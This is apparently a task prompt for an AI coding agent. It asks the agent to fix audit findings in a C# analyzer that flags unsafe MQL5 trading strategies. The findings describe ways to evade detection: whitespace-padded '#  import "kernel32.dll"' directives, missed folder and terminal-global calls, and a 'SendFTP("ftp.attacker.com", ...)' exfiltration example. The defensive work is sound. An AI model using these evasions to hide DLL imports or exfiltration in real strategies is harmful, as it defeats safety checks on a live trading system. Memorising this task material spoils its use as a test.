You are a fix agent on YO4X, a LIVE MetaTrader 5 / MQL5 algorithmic trading platform (.NET 10 backend, React frontend, an MQL5-to-C# transpiler, a deterministic backtest engine). An audit found defects in ONE file. Fix them.

THE ONLY FILE YOU MAY MODIFY:
  src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs

Read that file completely first. You may read any other file for context, but you must not edit any other file, create files, delete files, or run commands.

FINDINGS TO FIX (6):

[1] [P0] Preprocessor Directive Whitespace Evasion Bypasses Native DLL and Include Governance
    Where:   src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:1060-1064
    Failure: In valid MQL5 and C preprocessor syntax, arbitrary whitespace is valid between `#` and the directive token (e.g. `#  import "user32.dll"` or `#\tinclude "payload.mqh"`). `ImportDirectiveRegex` and `IncludeDirectiveRegex` mandate `^[\t ]*#import` and `^[\t ]*#include` without whitespace between `#` and the keyword. An untrusted strategy containing `#  import "kernel32.dll"` completely bypasses import detection: no `NATIVE_OR_EXTERNAL_IMPORT` feature or `DLL_OR_EXTERNAL_IMPORT_UNSUPPORTED` finding is emitted, leaving the file's static disposition as `NeedsSemanticValidation` rather than `Unsupported`.
    Suggested fix: Update `IncludeDirectiveRegex`, `ImportDirectiveRegex`, and `ResourceDirectiveRegex` to allow optional whitespace between the leading `#` and the directive keyword (e.g. `(?m)^[\t ]*#[\t ]*import[\t ]*\"...\"`).

[2] [P1] Missed Plural Global Variable Built-ins in Terminal Globals Detection
    Where:   src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:1027-1028
    Failure: Standard MQL5 runtime functions for global variable manipulation use plural identifiers: `GlobalVariablesTotal()`, `GlobalVariablesFlush()`, and `GlobalVariablesDeleteAll(...)`. Because `TerminalGlobalsRegex` searches for singular `GlobalVariable(?:...Total|DeleteAll)` and omits `Flush`, calls to `GlobalVariablesTotal()`, `GlobalVariablesFlush()`, and `GlobalVariablesDeleteAll(...)` fail to match. The file is not flagged with `PERSISTED_TERMINAL_GLOBALS` or `TERMINAL_GLOBAL_VARIABLES_UNSUPPORTED` and escapes the `Unsupported` disposition check.
    Suggested fix: Change `TerminalGlobalsRegex` to `\bGlobalVariables?(?:Check|Time|Del|Get|Name|Set|SetOnCondition|Temp|Total|DeleteAll|Flush)?\s*\(`.

[3] [P1] Missed `Folder*` File System APIs in File IO Detection
    Where:   src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:1012-1013
    Failure: Standard MQL5 folder-manipulation built-in functions `FolderCreate(...)`, `FolderDelete(...)`, and `FolderClean(...)` (catalogued in `Mql5BuiltinSignatures` as unsupported File built-ins) do not begin with the `File` prefix and are not matched by `FileIoRegex`. A strategy calling `FolderDelete("...")` or `FolderCreate("...")` produces no `FILE_IO` feature and no `ARBITRARY_FILE_IO_UNSUPPORTED` finding, allowing prohibited filesystem mutations to pass static analysis.
    Suggested fix: Update `FileIoRegex` to include `Folder(?:Create|Delete|Clean)` alongside `File(?:...)`.

[4] [P1] Missed `SendFTP`, `SendMail`, and `SendNotification` in Network IO Detection
    Where:   src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:1015-1016
    Failure: MQL5 provides native communication built-ins `SendFTP(...)`, `SendMail(...)`, and `SendNotification(...)` for exfiltrating data outside the local terminal. `NetworkIoRegex` only captures `WebRequest` and `Socket*` calls. A strategy calling `SendFTP("ftp.attacker.com", ...)` or `SendMail(...)` generates no `NETWORK_IO` feature or `NETWORK_ACCESS_UNSUPPORTED` finding, bypassing static network prohibition gates.
    Suggested fix: Add `SendFTP`, `SendMail`, and `SendNotification` to `NetworkIoRegex`.

[5] [P1] WinAPI Sub-Headers Under-Reported as `NeedsSource` Instead of `Unsupported` OS Include
    Where:   src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:590-595
    Failure: Standard MetaTrader Windows integration headers under `<WinAPI\...>` (e.g. `<WinAPI\fileapi.mqh>`, `<WinAPI\processthreadsapi.mqh>`, `<WinAPI\sysinfoapi.mqh>`) do not contain the substring `WinUser`, `kernel32`, or `shell32`, nor are they catalogued in `IsKnownPlatformInclude`. The static analyzer resolves them as `Mql5IncludeResolution.MissingSource` (status `NeedsSource`) instead of `OPERATING_SYSTEM_INCLUDE_UNSUPPORTED` (`Unsupported`). If the strategy author provides local stub files matching those relative paths, the corpus resolves them as `ResolvedInCorpus`, allowing OS integration headers to bypass unsupported classification.
    Suggested fix: Expand `IsOperatingSystemInclude` to match `WinAPI`, `winapi.mqh`, `user32`, `advapi32`, and all Windows API standard include headers.

[6] [P2] Multi-declaration and Inline `input` Parameters Undercounted by `InputDeclarationRegex`
    Where:   src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:997-998
    Failure: `InputDeclarationRegex` is anchored to line start with `(?m)^[\t ]*`. If multiple input parameters are declared on the same line (e.g. `input int Fast = 10; input int Slow = 20;`) or follow other inline statements (`int dummy = 0; input double Risk = 1.5;`), only the leading declaration (or none) matches. `OccurrenceCount` and the reported feature line array undercount the true number of declared strategy inputs.
    Suggested fix: Remove the line anchor `(?m)^[\t ]*` and match word boundary `\b(?:input|sinput)\b` across `codeOnly`.

HOW TO WORK:

1. Verify each finding against the actual code BEFORE changing anything. Line numbers may
   have shifted. If a finding is WRONG, or was already fixed, or the suggested fix would
   itself introduce a bug - do NOT apply it. Say so in your summary and move on. A refused
   bad fix is a good outcome; applying a wrong fix to a trading system is not.

2. Make the SMALLEST change that actually fixes the defect. Do not refactor, rename,
   reorder, reformat, restyle, or "improve" anything you were not asked about. Do not
   reflow existing lines. The diff must contain only the fix.

3. Match the surrounding code exactly - its naming, its comment density and voice, its
   error-handling idiom, its use of existing helpers. Read enough of the file to know what
   that is. Where the file already has a helper for what you need, use it rather than
   writing a new one.

4. Preserve public API and behaviour that was not identified as defective. If a correct
   fix would require changing a public signature, a database schema, a serialised contract,
   or shared behaviour outside this file, DO NOT do it - report it as needing a wider
   change instead.

5. This code decides real trades. For anything touching money, volume, price, margin, order
   state or time: be conservative, prefer failing closed over guessing, and preserve
   existing rounding/normalisation conventions unless the finding is specifically that the
   convention is wrong.

6. The project builds clean with zero warnings. Keep it that way - no unused variables, no
   unreachable code, no nullable warnings.

AFTER EDITING, output a short plain-text summary (no code fences), one line per finding:
  [n] APPLIED  - <what you changed, in a few words>
  [n] SKIPPED  - <why the finding was wrong or the fix unsafe>
Then a final line: FILES CHANGED: <the one path you edited, or NONE>

